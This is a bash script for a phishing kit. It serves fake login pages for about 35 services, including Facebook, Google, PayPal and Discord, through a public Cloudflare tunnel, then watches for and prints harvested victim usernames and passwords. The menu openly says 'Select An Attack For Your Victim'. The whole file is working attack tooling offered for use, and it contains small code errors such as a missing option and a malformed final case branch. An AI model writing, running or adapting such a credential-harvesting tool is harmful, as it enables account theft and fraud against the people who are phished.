__version__="0.0.1"

#default host and port.
HOST='127.0.0.1'
PORT='8080'

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

#Directories.

BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi


if [[ -e "cloudflared-linux-amd64" ]]; then
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
else
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
	wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
	chmod +x cloudflared-linux-amd64
fi


credentials() {
 
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit...\n"
	while true; do
		if [[ -e "$BASE_DIR/.sites/$website/usernames.txt" ]]; then
			mv $BASE_DIR/.sites/$website/usernames.txt $BASE_DIR/auth
			ACCOUNT=$(grep -o 'Username:.*' auth/usernames.txt | awk '{print $2}')
			PASSWORD=$(grep -o 'Pass:.*' auth/usernames.txt | awk -F ":." '{print $NF}')
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim credentials Found!"
			echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
			echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
			echo -e ${GREEN} "\n Saved in Folder: auth as usernames.txt"
		fi
		done
}

tunnel_menu() {
	cd "$BASE_DIR/.sites/$website"
	php -S $HOST:$PORT> /dev/null 2>&1 &
	echo -e "\n${BLUE}Tunnel Created at${BLUE}[${GREEN}http://$HOST:$PORT${BLUE}]${WHITE}"
	cd "$BASE_DIR"
	./cloudflared-linux-amd64 tunnel --url "$HOST:$PORT" > .cld.log 2>&1 &
	sleep 8
	cloud_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log" )
	echo -e "\n${BLUE}URL Created at ${BLUE}[${GREEN}$cloud_url${BLUE}]${WHITE}"
	credentials
	

	
	
	
}

main_menu() {
	{echo;}
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 

		${RED}[${WHITE}99${RED}]${ORANGE} About         ${WHITE}Press[${GREEN}ctrl+C${WHITE}]to exit.

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	case $REPLY in 

		 1 | 01)
		 	website="facebook"
			tunnel_menu;;

		2 | 02)
			website="instagram"
			tunnel_menu;;

		3 | 03)
			website="google"
			tunnel_menu;;

		4 | 04)
			website="microsoft"
			tunnel_menu;;

		5 | 05)
			website="netflix"
			tunnel_menu;;

		6 | 06)
			website="paypal"
			tunnel_menu;;


		7 | 07)
			website="steam"
			tunnel_menu;;

		8 | 08)
			website="twitter"
			tunnel_menu;;

		9 | 09)
			website="playstation"
			tunnel_menu;;

		10)
			website="tiktok"
			tunnel_menu;;


		11)
			website="twitch"
			tunnel_menu;;

		12)
			website="pinterest"
			tunnel_menu;;

		13)
			website="snapchat"
			tunnel_menu;;

		14)
			website="linkedin"
			tunnel_menu;;

		15)
			website="ebay"
			tunnel_menu;;

		16)
			website="quora"
			tunnel_menu;;

		17)
			website="protonmail"
			tunnel_menu;;

		18)
			website="spotify"
			tunnel_menu;;

		19)
			website="reddit"
			tunnel_menu;;

		20)
			website="adobe"
			tunnel_menu;;

		21)
			website="deviantart"
			tunnel_menu;;

		22)
			website="badoo"
			tunnel_menu;;

		23)
			website="origin"
			tunnel_menu;;

		24)
			website="dropbox"
			tunnel_menu;;

		25)
			website="yahoo"
			tunnel_menu;;

		26)
			website="wordpress"
			tunnel_menu;;

		27)
			website="yandex"
			tunnel_menu;;

		28)
			website="stackoverflow"
			tunnel_menu;;

		30)
			website="xbox"
			tunnel_menu;;

		31)
			website="mediafire"
			tunnel_menu;;


		32)
			website="gitlab"
			tunnel_menu;;


		33)
			website="github"
			tunnel_menu;;

		34)
			website="discord"
			tunnel_menu;;

		35)
			website="roblox"
			tunnel_menu;

			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	esac
}
main_menu
